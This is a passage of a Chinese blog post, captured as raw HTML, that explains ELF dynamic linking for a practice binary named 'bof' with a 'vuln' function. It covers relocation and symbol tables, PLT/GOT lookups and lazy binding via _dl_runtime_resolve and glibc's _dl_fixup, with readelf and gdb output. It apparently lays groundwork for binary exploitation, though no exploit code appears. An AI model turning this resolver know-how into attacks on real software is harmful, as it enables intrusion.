  A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048650 000650 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048684 000684 0000f4 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a020 001020 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a040 001028 00000c 00  WA  0   0 32</span><br><span class="line">  [27] .comment          PROGBITS        00000000 001028 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 001798 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001060 0004b0 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 001510 000288 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>其中类型为 REL 的节区包含重定位表项，结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"><span class="comment">/* I have seen two different definitions of the Elf64_Rel and</span></span><br><span class="line"><span class="comment">   Elf64_Rela structures, so we'll leave them out until Novell (or</span></span><br><span class="line"><span class="comment">   whoever) gets their act together.  */</span></span><br><span class="line"><span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure><p>执行<code>readelf -r ./bof</code>，其中<code>.rel.plt</code>节用于函数重定位，<code>.rel.dyn</code>节用于变量重定位：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">λ readelf -r ./bof</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.dyn'</span> at offset 0x318 contains 3 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line">0804a040  00000905 R_386_COPY        0804a040   stdin@GLIBC_2.0</span><br><span class="line">0804a044  00000705 R_386_COPY        0804a044   stdout@GLIBC_2.0</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.plt'</span> at offset 0x330 contains 5 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   <span class="built_in">read</span>@GLIBC_2.0</span><br><span class="line">0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br><span class="line">0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure><p>以<code>read</code>为例，<code>read</code>函数的<code>r_offset为=0x0804a010</code>，<code>r_info=0x00000207</code></p><p><code>.got</code>节保存全局变量偏移表，<code>.got.plt</code>节保存全局函数偏移表。<code>.got.plt</code>对应着<code>Elf32_Rel</code>结构中<code>r_offset</code>的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section        st_shndx;                <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section        st_shndx;                <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p><code>.dynsym</code>节包含了动态链接符号表。<code>Elf32_Sym[num]</code>中的<code>num</code>对应着<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)</code></p><p>以<code>read</code>为例，<code>read</code>的索引值为<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)=ELF32_R_SYM(0x00000207)=0x00000207&gt;&gt;8=2</code>，所以<code>Elf32_Sym[2]</code>保存着<code>read</code>的符号表信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">λ readelf -s ./bof</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 10 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.0 (2)</span><br><span class="line">     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND <span class="built_in">read</span>@GLIBC_2.0 (2)</span><br><span class="line">     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.0 (2)</span><br><span class="line">     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)</span><br><span class="line">     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)</span><br><span class="line">     7: 0804a044     4 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.0 (2)</span><br><span class="line">     8: 0804864c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used</span><br><span class="line">     9: 0804a040     4 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.0 (2)</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">'.symtab'</span> contains 75 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 08048154     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     2: 08048168     0 SECTION LOCAL  DEFAULT    2</span><br><span class="line">     3: 08048188     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     4: 080481ac     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     5: 080481d8     0 SECTION LOCAL  DEFAULT    5</span><br><span class="line">     6: 08048278     0 SECTION LOCAL  DEFAULT    6</span><br><span class="line">     7: 080482e4     0 SECTION LOCAL  DEFAULT    7</span><br><span class="line">     8: 080482f8     0 SECTION LOCAL  DEFAULT    8</span><br><span class="line">     9: 08048318     0 SECTION LOCAL  DEFAULT    9</span><br><span class="line">    10: 08048330     0 SECTION LOCAL  DEFAULT   10</span><br><span class="line">    11: 08048358     0 SECTION LOCAL  DEFAULT   11</span><br><span class="line">    12: 08048380     0 SECTION LOCAL  DEFAULT   12</span><br><span class="line">    13: 080483e0     0 SECTION LOCAL  DEFAULT   13</span><br><span class="line">    14: 080483f0     0 SECTION LOCAL  DEFAULT   14</span><br><span class="line">    15: 08048634     0 SECTION LOCAL  DEFAULT   15</span><br><span class="line">    16: 08048648     0 SECTION LOCAL  DEFAULT   16</span><br><span class="line">    17: 08048650     0 SECTION LOCAL  DEFAULT   17</span><br><span class="line">    18: 08048684     0 SECTION LOCAL  DEFAULT   18</span><br><span class="line">    19: 08049f08     0 SECTION LOCAL  DEFAULT   19</span><br><span class="line">    20: 08049f0c     0 SECTION LOCAL  DEFAULT   20</span><br><span class="line">    21: 08049f10     0 SECTION LOCAL  DEFAULT   21</span><br><span class="line">    22: 08049f14     0 SECTION LOCAL  DEFAULT   22</span><br><span class="line">    23: 08049ffc     0 SECTION LOCAL  DEFAULT   23</span><br><span class="line">    24: 0804a000     0 SECTION LOCAL  DEFAULT   24</span><br><span class="line">    25: 0804a020     0 SECTION LOCAL  DEFAULT   25</span><br><span class="line">    26: 0804a040     0 SECTION LOCAL  DEFAULT   26</span><br><span class="line">    27: 00000000     0 SECTION LOCAL  DEFAULT   27</span><br><span class="line">    28: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    29: 08049f10     0 OBJECT  LOCAL  DEFAULT   21 __JCR_LIST__</span><br><span class="line">    30: 08048430     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones</span><br><span class="line">    31: 08048460     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones</span><br><span class="line">    32: 080484a0     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux</span><br><span class="line">    33: 0804a048     1 OBJECT  LOCAL  DEFAULT   26 completed.7209</span><br><span class="line">    34: 08049f0c     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtors_aux_fin</span><br><span class="line">    35: 080484c0     0 FUNC    LOCAL  DEFAULT   14 frame_dummy</span><br><span class="line">    36: 08049f08     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_init_array_</span><br><span class="line">    37: 00000000     0 FILE    LOCAL  DEFAULT  ABS bof.c</span><br><span class="line">    38: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    39: 08048774     0 OBJECT  LOCAL  DEFAULT   18 __FRAME_END__</span><br><span class="line">    40: 08049f10     0 OBJECT  LOCAL  DEFAULT   21 __JCR_END__</span><br><span class="line">    41: 00000000     0 FILE    LOCAL  DEFAULT  ABS</span><br><span class="line">    42: 08049f0c     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_end</span><br><span class="line">    43: 08049f14     0 OBJECT  LOCAL  DEFAULT   22 _DYNAMIC</span><br><span class="line">    44: 08049f08     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_start</span><br><span class="line">    45: 08048650     0 NOTYPE  LOCAL  DEFAULT   17 __GNU_EH_FRAME_HDR</span><br><span class="line">    46: 0804a000     0 OBJECT  LOCAL  DEFAULT   24 _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    47: 08048630     2 FUNC    GLOBAL DEFAULT   14 __libc_csu_fini</span><br><span class="line">    48: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@@GLIBC_2.0</span><br><span class="line">    49: 00000000     0 FUNC    GLOBAL DEFAULT  UND <span class="built_in">read</span>@@GLIBC_2.0</span><br><span class="line">    50: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab</span><br><span class="line">    51: 08048420     4 FUNC    GLOBAL HIDDEN    14 __x86.get_pc_thunk.bx</span><br><span class="line">    52: 0804a020     0 NOTYPE  WEAK   DEFAULT   25 data_start</span><br><span class="line">    53: 080484eb    52 FUNC    GLOBAL DEFAULT   14 vuln</span><br><span class="line">    54: 0804a028     0 NOTYPE  GLOBAL DEFAULT   25 _edata</span><br><span class="line">    55: 08048634     0 FUNC    GLOBAL DEFAULT   15 _fini</span><br><span class="line">    56: 0804a020     0 NOTYPE  GLOBAL DEFAULT   25 __data_start</span><br><span class="line">    57: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">    58: 0804a024     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle</span><br><span class="line">    59: 0804864c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used</span><br><span class="line">    60: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@@GLIBC_2.0</span><br><span class="line">    61: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_</span><br><span class="line">    62: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@@GLIBC_2.0</span><br><span class="line">    63: 080485d0    93 FUNC    GLOBAL DEFAULT   14 __libc_csu_init</span><br><span class="line">    64: 0804a040     4 OBJECT  GLOBAL DEFAULT   26 stdin@@GLIBC_2.0</span><br><span class="line">    65: 0804a04c     0 NOTYPE  GLOBAL DEFAULT   26 _end</span><br><span class="line">    66: 080483f0     0 FUNC    GLOBAL DEFAULT   14 _start</span><br><span class="line">    67: 08048648     4 OBJECT  GLOBAL DEFAULT   16 _fp_hw</span><br><span class="line">    68: 0804a044     4 OBJECT  GLOBAL DEFAULT   26 stdout@@GLIBC_2.0</span><br><span class="line">    69: 0804a028     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start</span><br><span class="line">    70: 0804851f   165 FUNC    GLOBAL DEFAULT   14 main</span><br><span class="line">    71: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses</span><br><span class="line">    72: 0804a028     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__</span><br><span class="line">    73: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable</span><br><span class="line">    74: 08048358     0 FUNC    GLOBAL DEFAULT   11 _init</span><br></pre></td></tr></table></figure><p><code>.dynstr</code>节包含了动态链接的字符串。这个节以<code>\x00</code>作为开始和结尾，中间每个字符串也以<code>\x00</code>间隔</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/12s 0x08048278</span><br><span class="line">0x8048278:&quot;&quot;</span><br><span class="line">0x8048279:&quot;libc.so.6&quot;</span><br><span class="line">0x8048283:&quot;_IO_stdin_used&quot;</span><br><span class="line">0x8048292:&quot;stdin&quot;</span><br><span class="line">0x8048298:&quot;strlen&quot;</span><br><span class="line">0x804829f:&quot;read&quot;</span><br><span class="line">0x80482a4:&quot;stdout&quot;</span><br><span class="line">0x80482ab:&quot;setbuf&quot;</span><br><span class="line">0x80482b2:&quot;__libc_start_main&quot;</span><br><span class="line">0x80482c4:&quot;write&quot;</span><br><span class="line">0x80482ca:&quot;__gmon_start__&quot;</span><br><span class="line">0x80482d9:&quot;GLIBC_2.0&quot;</span><br></pre></td></tr></table></figure><p><code>Elf32_Sym[2]-&gt;st_name=0x27</code>（<code>.dynsym + Elf32_Sym_size * num</code>），所以<code>.dynstr</code>加上<code>0x27</code>的偏移量，就是字符串<code>read</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/wx 0x080481d8+0x10*2</span><br><span class="line">0x80481f8:0x00000027</span><br><span class="line">assassinq&gt;&gt; x/s 0x08048278+0x27</span><br><span class="line">0x804829f:&quot;read&quot;</span><br></pre></td></tr></table></figure><p><code>.plt</code>节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置（<code>.plt + Elf32_Sym_size * num</code>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/3i 0x08048380+0x10*2</span><br><span class="line">   0x80483a0 &lt;read@plt&gt;:jmp    DWORD PTR ds:0x804a010</span><br><span class="line">   0x80483a6 &lt;read@plt+6&gt;:push   0x8</span><br><span class="line">   0x80483ab &lt;read@plt+11&gt;:jmp    0x8048380</span><br></pre></td></tr></table></figure><h2 id="Lazy-Binding"><a href="#Lazy-Binding" class="headerlink" title="Lazy Binding"></a>Lazy Binding</h2><p>在程序执行的过程中，可能有些引入的 C 库函数到结束时都不会执行。所以 ELF 采用延迟绑定的技术，在第一次调用 C 库函数时才会去寻找真正的位置进行绑定</p><p>当程序执行<code>call read@plt</code>时，实际会跳到<code>0x804a010</code>去执行。而<code>0x080483a0</code>处的汇编代码仅仅三行，第一行中<code>0x804a010</code>为<code>read</code>的 GOT 表位置，第一次调用<code>read</code>时，对应的 GOT 表中并没有放<code>read</code>的真实地址，而是<code>read@plt</code>的下一条指令地址；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/wx 0x804a010</span><br><span class="line">0x804a010:0x080483a6</span><br></pre></td></tr></table></figure><p>第二行和第三行把<code>reloc_arg=0x8</code>作为参数放进栈里，然后跳到<code>0x8048380</code>（<code>PLT[0]</code>）继续执行；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/2i 0x080483a6</span><br><span class="line">   0x80483a6 &lt;read@plt+6&gt;:push   0x8</span><br><span class="line">   0x80483ab &lt;read@plt+11&gt;:jmp    0x8048380</span><br></pre></td></tr></table></figure><p>接下来<code>PLT[0]</code>再把<code>link_map=*(GOT+4)</code>（即<code>GOT[1]</code>，链接器的标识信息）作为参数推入栈中，而<code>*(GOT+8)</code>（即<code>GOT[2]</code>，动态链接器中的入口点）中保存的是<code>_dl_runtime_resolve</code>函数的地址；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/2i 0x8048380</span><br><span class="line">   0x8048380:push   DWORD PTR ds:0x804a004</span><br><span class="line">   0x8048386:jmp    DWORD PTR ds:0x804a008</span><br></pre></td></tr></table></figure><p>因此以上指令相当于执行了<code>_dl_runtime_resolve(link_map, reloc_arg)</code>，该函数会完成符号的解析，即将真实的<code>read</code>函数地址写入其<code>GOT</code>条目中，随后把控制权交给<code>read</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/wx 0x804a008</span><br><span class="line">0x804a008:0xf7fee000</span><br><span class="line">assassinq&gt;&gt; x/11i 0xf7fee000</span><br><span class="line">   0xf7fee000 &lt;_dl_runtime_resolve&gt;:push   eax</span><br><span class="line">   0xf7fee001 &lt;_dl_runtime_resolve+1&gt;:push   ecx</span><br><span class="line">   0xf7fee002 &lt;_dl_runtime_resolve+2&gt;:push   edx</span><br><span class="line">   0xf7fee003 &lt;_dl_runtime_resolve+3&gt;:mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line">   0xf7fee007 &lt;_dl_runtime_resolve+7&gt;:mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line">   0xf7fee00b &lt;_dl_runtime_resolve+11&gt;:call   0xf7fe77e0 &lt;_dl_fixup&gt;</span><br><span class="line">   0xf7fee010 &lt;_dl_runtime_resolve+16&gt;:pop    edx</span><br><span class="line">   0xf7fee011 &lt;_dl_runtime_resolve+17&gt;:mov    ecx,DWORD PTR [esp]</span><br><span class="line">   0xf7fee014 &lt;_dl_runtime_resolve+20&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0xf7fee017 &lt;_dl_runtime_resolve+23&gt;:mov    eax,DWORD PTR [esp+0x4]</span><br><span class="line">   0xf7fee01b &lt;_dl_runtime_resolve+27&gt;:ret    0xc</span><br></pre></td></tr></table></figure><p><code>_dl_fixup</code>在<a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html" target="_blank" rel="noopener">dl-runtime.c</a>中实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">  ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">  struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="comment">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line"><span class="comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line">  <span class="comment">/* Sanity check that we're really looking at a PLT relocation.  */</span></span><br><span class="line"><span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">  <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not used don't look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span 